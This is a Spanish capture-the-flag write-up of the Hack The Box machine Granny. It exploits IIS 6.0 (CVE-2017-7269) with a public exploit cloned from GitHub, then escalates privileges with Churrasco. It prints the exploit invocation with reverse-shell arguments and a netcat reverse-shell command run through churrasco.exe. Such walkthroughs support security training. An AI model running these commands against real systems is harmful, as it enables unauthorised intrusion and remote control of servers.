# 🏳 Granny

<figure><img src="../../../../.gitbook/assets/e8a122e2d713a4fb4a180bb9ccd20248.png" alt=""><figcaption></figcaption></figure>

<table><thead><tr><th width="227">Datos</th><th width="288.3333333333333"> </th><th>Notas</th></tr></thead><tbody><tr><td>Nombre de la máquina: </td><td><a href="https://app.hackthebox.com/machines/14">Granny</a></td><td></td></tr><tr><td>IP de la máquina:</td><td>10.10.10.15</td><td></td></tr><tr><td>Sistema simulado: </td><td>Windows Server 2003</td><td></td></tr><tr><td>Servicio vulnerado: </td><td>Microsoft-IIS 6.0</td><td></td></tr><tr><td>CVEs:</td><td><a href="https://nvd.nist.gov/vuln/detail/cve-2017-7269">CVE 2017-7269</a></td><td></td></tr></tbody></table>

### 1. Enumeración y descubrimiento

Comenzamos el trabajo con la máquina Granny elaborando un escaneo de todos los puertos de la máquina mediante nmap como es habitual.&#x20;

<figure><img src="../../../../.gitbook/assets/1 (19).png" alt=""><figcaption></figcaption></figure>

Como podemos ver está aparentemente solo funcionando el puerto 80. Vamos a acceder a la web para ver ¿Que está montado en la máquina?.

<figure><img src="../../../../.gitbook/assets/2 (11).png" alt=""><figcaption></figcaption></figure>

### 2. Explotación

Vemos que es un portal que está aparentemente bajo construcción montado en un Windows Server 2003. En este punto empezamos a buscar si la versión IIS 6.0 tiene alguna vulnerabilidad activa y encontramos que el CVE 2017-7269 puede ser una buena opción. Existen varios exploits que pueden ayudarnos a explotar este CVE pero en nuestro caso vamos a usar el desarrollado por g0rx y que podemos encontrar en [su Github](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269). Recuerdo que podeís usar Searchexploit o buscar por internet para encontrar otras alternativas. Nos vamos a copiar su directorio en el escritorio y comenzamos.

```bash
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git
```

&#x20;El uso del exploit biene explicado dentro del mismo en el código, pero os lo dejaré explicado aquí. Basicamente ejecutaremos el archivo con python y usaremos la siguiente estructura para ejecutarlo:

```bash
python2 iis6webdav.py [TargetIP] [TargetPORT] [ReverseIP] [ReversePORT]
```

Al ejecutarlo ganaremos acceso a la máquina como el usuario Network Service

<figure><img src="../../../../.gitbook/assets/3 (15).png" alt=""><figcaption></figcaption></figure>

En este punto aprovecharemos para ejecutar systeminfo y obtener más información sobre la página.&#x20;

<figure><img src="../../../../.gitbook/assets/4 (12).png" alt=""><figcaption></figcaption></figure>

### 3. Escalada de privilegios Root

En este punto utilizaremos el script de Python [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) para ver cual es el exploit que podemos utilizar para explotar la máquina. Descubrimos que el exploit [Churrasco](https://github.com/Re4son/Churrasco) es el que podemos utilizar para explotar la máquina.&#x20;

{% hint style="danger" %}
&#x20;Al ejecutar el programa que se encuentra en el repositorio directamente yo he tenido muchos problemas, la respuesta que daba el sistema era "Program too big to fit in memory", como se muestra en la captura más abajo, esto lo he resuelto cuando descomprimido el archivo `Churrasco.zip` y he usado el `churrasco.exe` que venía en el zip.  Sin duda ha sido un buen quebradero de cabeza ya que nadie ha reportado, que yo haya podido encontrar, el error.&#x20;
{% endhint %}

<figure><img src="../../../../.gitbook/assets/5 (13).png" alt=""><figcaption></figcaption></figure>

Para ejecutarlo generaremos un servidor smb mediante el cual subiremos dos archivos a la máquina, un nc.exe y churrasco.exe .

<figure><img src="../../../../.gitbook/assets/6 (11).png" alt=""><figcaption></figcaption></figure>

En este punto deberemos de ejecutar el script churrasco indicando la dirección de neustro servicio Netcat a la escucha.&#x20;

```bash
\churrasco.exe -d "C:\WINDOWS\Temp\nc.exe -e cmd.exe [IP] [PORT]"
```

En nuestra máquina deberemos estar escuchando a la IP seleccionada.&#x20;

<figure><img src="../../../../.gitbook/assets/1 (16).png" alt=""><figcaption></figcaption></figure>

Ya como administradores podremos ver las flags del usuario Lakis y el usuario Root y dar por resuelto el reto.&#x20;

{% hint style="info" %}
Si te he ayudado sígueme y apóyame en [Hack The Box ](https://app.hackthebox.com/profile/819073)
{% endhint %}
